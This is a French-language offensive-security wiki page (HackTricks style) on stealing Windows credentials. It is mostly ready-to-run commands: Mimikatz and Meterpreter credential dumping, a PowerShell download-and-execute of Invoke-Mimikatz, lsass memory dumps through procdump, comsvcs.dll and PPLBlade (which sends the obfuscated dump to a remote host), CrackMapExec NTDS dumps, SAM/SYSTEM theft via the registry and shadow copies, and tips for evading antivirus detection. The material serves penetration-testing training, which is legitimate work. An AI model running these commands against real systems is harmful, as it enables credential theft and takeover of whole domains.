# Vol de Credentials Windows

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Trouvez d'autres choses que Mimikatz peut faire sur** [**cette page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Découvrez ici quelques protections possibles des identifiants.**](credentials-protections.md) **Ces protections pourraient empêcher Mimikatz d'extraire certains identifiants.**

## Identifiants avec Meterpreter

Utilisez le [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **que** j'ai créé pour **rechercher des mots de passe et des hachages** à l'intérieur de la victime.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Contournement de l'AV

### Procdump + Mimikatz

Comme **Procdump de** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**est un outil légitime de Microsoft**, il n'est pas détecté par Defender.\
Vous pouvez utiliser cet outil pour **extraire le processus lsass**, **télécharger le dump** et **extraire** les **identifiants localement** à partir du dump.

Vous pouvez également utiliser [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Ce processus est effectué automatiquement avec [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Remarque**: Certains **AV** peuvent **détecter** comme **malveillant** l'utilisation de **procdump.exe pour dumper lsass.exe**, cela est dû au fait qu'ils **détectent** la chaîne **"procdump.exe" et "lsass.exe"**. Il est donc **plus furtif** de **passer** comme **argument** le **PID** de lsass.exe à procdump **au lieu de** le **nom lsass.exe.**

### Dumper lsass avec **comsvcs.dll**

Une DLL nommée **comsvcs.dll** trouvée dans `C:\Windows\System32` est responsable de **dumper la mémoire du processus** en cas de crash. Cette DLL inclut une **fonction** nommée **`MiniDumpW`**, conçue pour être invoquée en utilisant `rundll32.exe`.\
Il est sans importance d'utiliser les deux premiers arguments, mais le troisième est divisé en trois composants. L'ID du processus à dumper constitue le premier composant, l'emplacement du fichier de dump représente le second, et le troisième composant est strictement le mot **full**. Aucune option alternative n'existe.\
Après avoir analysé ces trois composants, la DLL est engagée à créer le fichier de dump et à transférer la mémoire du processus spécifié dans ce fichier.\
L'utilisation de **comsvcs.dll** est faisable pour dumper le processus lsass, éliminant ainsi le besoin de télécharger et d'exécuter procdump. Cette méthode est décrite en détail à [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

La commande suivante est utilisée pour l'exécution :
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Vous pouvez automatiser ce processus avec** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping lsass avec le Gestionnaire des tâches**

1. Faites un clic droit sur la barre des tâches et cliquez sur Gestionnaire des tâches
2. Cliquez sur Plus de détails
3. Recherchez le processus "Local Security Authority Process" dans l'onglet Processus
4. Faites un clic droit sur le processus "Local Security Authority Process" et cliquez sur "Créer un fichier de vidage".

### Dumping lsass avec procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) est un binaire signé par Microsoft qui fait partie de la suite [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dumping lsass avec PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) est un outil de vidage de processus protégé qui prend en charge l'obfuscation des fichiers de vidage mémoire et leur transfert sur des stations de travail distantes sans les déposer sur le disque.

**Fonctionnalités clés** :

1. Contournement de la protection PPL
2. Obfuscation des fichiers de vidage mémoire pour échapper aux mécanismes de détection basés sur les signatures de Defender
3. Téléchargement du vidage mémoire avec des méthodes de téléchargement RAW et SMB sans le déposer sur le disque (vidage sans fichier)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump the NTDS.dit depuis le DC cible
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump the NTDS.dit password history from target DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Afficher l'attribut pwdLastSet pour chaque compte NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Vol de SAM & SYSTEM

Ces fichiers devraient être **situés** dans _C:\windows\system32\config\SAM_ et _C:\windows\system32\config\SYSTEM._ Mais **vous ne pouvez pas simplement les copier de manière régulière** car ils sont protégés.

### Depuis le Registre

La façon la plus simple de voler ces fichiers est d'obtenir une copie depuis le registre :
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Téléchargez** ces fichiers sur votre machine Kali et **extraites les hashes** en utilisant :
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Vous pouvez effectuer une copie de fichiers protégés en utilisant ce service. Vous devez être Administrateur.

#### Using vssadmin

vssadmin binaire est uniquement disponible dans les versions Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Mais vous pouvez faire la même chose avec **Powershell**. Voici un exemple de **comment copier le fichier SAM** (le disque dur utilisé est "C:" et il est enregistré dans C:\users\Public) mais vous pouvez utiliser cela pour copier n'importe quel fichier protégé :
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Enfin, vous pouvez également utiliser le [**script PS Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) pour faire une copie de SAM, SYSTEM et ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Identifiants Active Directory - NTDS.dit**

Le fichier **NTDS.dit** est connu comme le cœur de **Active Directory**, contenant des données cruciales sur les objets utilisateurs, les groupes et leurs adhésions. C'est là que les **hashs de mot de passe** pour les utilisateurs de domaine sont stockés. Ce fichier est une base de données **Extensible Storage Engine (ESE)** et se trouve à **_%SystemRoom%/NTDS/ntds.dit_**.

Dans cette base de données, trois tables principales sont maintenues :

- **Table de données** : Cette table est chargée de stocker des détails sur des objets comme les utilisateurs et les groupes.
- **Table de liens** : Elle suit les relations, telles que les adhésions aux groupes.
- **Table SD** : Les **descripteurs de sécurité** pour chaque objet y sont conservés, garantissant la sécurité et le contrôle d'accès pour les objets stockés.

Plus d'informations à ce sujet : [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows utilise _Ntdsa.dll_ pour interagir avec ce fichier et il est utilisé par _lsass.exe_. Ensuite, **une partie** du fichier **NTDS.dit** pourrait être localisée **dans la mémoire de `lsass`** (vous pouvez trouver les données récemment accédées probablement à cause de l'amélioration des performances grâce à un **cache**).

#### Décryptage des hashs à l'intérieur de NTDS.dit

Le hash est chiffré 3 fois :

1. Décrypter la clé de chiffrement de mot de passe (**PEK**) en utilisant le **BOOTKEY** et **RC4**.
2. Décrypter le **hash** en utilisant **PEK** et **RC4**.
3. Décrypter le **hash** en utilisant **DES**.

**PEK** a la **même valeur** dans **chaque contrôleur de domaine**, mais il est **chiffré** à l'intérieur du fichier **NTDS.dit** en utilisant le **BOOTKEY** du **fichier SYSTEM du contrôleur de domaine (différent entre les contrôleurs de domaine)**. C'est pourquoi pour obtenir les identifiants du fichier NTDS.dit **vous avez besoin des fichiers NTDS.dit et SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copier NTDS.dit en utilisant Ntdsutil

Disponible depuis Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Vous pouvez également utiliser le [**volume shadow copy**](#stealing-sam-and-system) pour copier le fichier **ntds.dit**. N'oubliez pas que vous aurez également besoin d'une copie du fichier **SYSTEM** (encore une fois, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system)).

### **Extraction des hashes depuis NTDS.dit**

Une fois que vous avez **obtenu** les fichiers **NTDS.dit** et **SYSTEM**, vous pouvez utiliser des outils comme _secretsdump.py_ pour **extraire les hashes** :
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Vous pouvez également **les extraire automatiquement** en utilisant un utilisateur administrateur de domaine valide :
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Pour **de gros fichiers NTDS.dit**, il est recommandé de les extraire en utilisant [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Enfin, vous pouvez également utiliser le **module metasploit** : _post/windows/gather/credentials/domain_hashdump_ ou **mimikatz** `lsadump::lsa /inject`

### **Extraction des objets de domaine de NTDS.dit vers une base de données SQLite**

Les objets NTDS peuvent être extraits vers une base de données SQLite avec [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Non seulement les secrets sont extraits, mais aussi l'ensemble des objets et leurs attributs pour une extraction d'informations supplémentaire lorsque le fichier NTDS.dit brut a déjà été récupéré.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Le `SYSTEM` hive est optionnel mais permet le déchiffrement des secrets (hashes NT & LM, informations d'identification supplémentaires telles que les mots de passe en clair, clés kerberos ou de confiance, historiques de mots de passe NT & LM). Avec d'autres informations, les données suivantes sont extraites : comptes utilisateurs et machines avec leurs hashes, drapeaux UAC, horodatage pour la dernière connexion et le changement de mot de passe, description des comptes, noms, UPN, SPN, groupes et adhésions récursives, arbre des unités organisationnelles et adhésion, domaines de confiance avec type de confiance, direction et attributs...

## Lazagne

Téléchargez le binaire depuis [ici](https://github.com/AlessandroZ/LaZagne/releases). Vous pouvez utiliser ce binaire pour extraire des informations d'identification de plusieurs logiciels.
```
lazagne.exe all
```
## Autres outils pour extraire des identifiants de SAM et LSASS

### Windows credentials Editor (WCE)

Cet outil peut être utilisé pour extraire des identifiants de la mémoire. Téléchargez-le depuis : [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extraire des identifiants du fichier SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Extraire les identifiants du fichier SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Téléchargez-le depuis : [ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) et **exécutez-le** et les mots de passe seront extraits.

## Défenses

[**Découvrez quelques protections des identifiants ici.**](credentials-protections.md)

{{#include ../../banners/hacktricks-training.md}}
